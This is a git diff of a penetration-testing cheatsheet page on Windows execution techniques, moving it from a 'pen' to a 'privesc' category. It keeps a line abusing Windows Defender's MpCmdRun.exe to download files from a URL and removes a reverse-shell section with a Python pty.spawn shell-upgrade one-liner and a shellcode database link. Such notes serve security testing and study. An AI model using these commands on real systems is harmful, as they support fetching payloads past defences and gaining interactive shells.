@@ -1,10 +1,10 @@
 ---
 layout: post
-title: pen / win / exec
-category: pen
+title: privesc / win / exec
+category: privesc
 parent: cheatsheets
 modified_date: 2023-07-16
-permalink: /pen/win/exec
+permalink: /privesc/win/exec
 ---
 
 **Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)
@@ -29,13 +29,6 @@ dl = download
 ```sh
 # download
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path>
-```
-
-## <a name='rshell'></a>rshell
-[database](https://shell-storm.org/shellcode/index.html)
-```sh
-# run bash via python
-python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ## <a name='escalation'></a>escalation
